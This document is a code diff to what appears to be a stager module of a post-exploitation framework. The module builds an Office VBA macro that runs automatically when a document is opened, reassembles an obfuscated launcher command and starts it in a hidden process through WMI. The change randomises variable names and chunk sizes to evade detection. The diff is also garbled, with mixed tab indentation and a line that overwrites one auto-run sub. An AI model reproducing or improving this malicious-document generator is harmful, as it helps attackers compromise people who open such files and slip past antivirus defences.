@@ -119,39 +119,49 @@ class Stager:
         if obfuscate.lower() == "true":
             obfuscateScript = True
 
-        # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
-
+ # generate the launcher code
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
+		
         if launcher == "":
             print helpers.color("[!] Error in launcher command generation.")
             return ""
-        else:
-            launcher, noise = self.addnoise(launcher.replace("'", "\\'"), noiselevel)
-            chunks = list(helpers.chunks(launcher, 50))
-            payload = "\tDim Str As String\n"
-            payload += "\tDim Noise As String\n"
-            payload += "\tDim Counter As Integer\n"
-            payload += "\tnoise = \"" + noise + "\"\n"
-            payload += "\tstr = '" + str(chunks[0]) + "'\n"
+        else:	   
+	    LengthOfVari = random.randint(1,35)
+	    LengthOfChunks = random.randint(1,100)
+		
+            launcher, noise = self.addnoise(launcher, noiselevel)
+            chunks = list(helpers.chunks(launcher, LengthOfChunks))
+		
+            Str = ''.join(random.choice(string.letters) for i in range(LengthOfVari))
+            NoiseMacVari = ''.join(random.choice(string.letters) for i in range(LengthOfVari))
+            Counter = ''.join(random.choice(string.letters) for i in range(LengthOfVari))
+            Method=''.join(random.choice(string.letters) for i in range(LengthOfVari))
+		
+            payload = "\tDim "+Str+" As String\n"
+            payload += "\tDim "+NoiseMacVari+" As String\n"
+            payload += "\tDim "+Counter+" As Integer\n"
+            payload += "\t"+NoiseMacVari+" = \"" + noise + "\"\n"
+            payload += "\t"+Str+" = \"" + str(chunks[0]) + "\"\n"
+	
             for chunk in chunks[1:]:
-                payload += "\tstr = str + '" + str(chunk) + "'\n"
+                payload += "\t"+Str+" = "+Str+" + \"" + str(chunk) + "\"\n"
 
-            payload += "\tFor counter = 1 to len(noise)\n"
-            payload += "\tstr = replace(str,mid(noise,counter,1),\"\")\n"
+            payload += "\tFor "+Counter+" = 1 to len("+NoiseMacVari+")\n"
+            payload += "\t"+Str+" = replace("+Str+",mid("+NoiseMacVari+","+Counter+",1),\"\")\n"
             payload += "\tNext\n"
 
             macro = "Sub Auto_Open()\n"
-            macro += "\tDebugging\n"
+            macro += "\t"+Method+"\n"
             macro += "End Sub\n\n"
             macro = "Sub AutoOpen()\n"
-            macro += "\tDebugging\n"
+            macro += "\t"+Method+"\n"
             macro += "End Sub\n\n"
 
             macro += "Sub Document_Open()\n"
-            macro += "\tDebugging\n"
+            macro += "\t"+Method+"\n"
             macro += "End Sub\n\n"
 
-            macro += "Public Function Debugging() As Variant\n"
+            macro += "Public Function "+Method+"() As Variant\n"
             macro += payload
             macro += "\tConst HIDDEN_WINDOW = 0\n"
             macro += "\tstrComputer = \".\"\n"
@@ -160,7 +170,7 @@ class Stager:
             macro += "\tSet objConfig = objStartup.SpawnInstance_\n"
             macro += "\tobjConfig.ShowWindow = HIDDEN_WINDOW\n"
             macro += "\tSet objProcess = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\cimv2:Win32_Process\")\n"
-            macro += "\tobjProcess.Create str, Null, objConfig, intProcessID\n"
+            macro += "\tobjProcess.Create "+Str+", Null, objConfig, intProcessID\n"
             macro += "End Function\n"
-
-            return macro
+            	    
+ 	    return macro
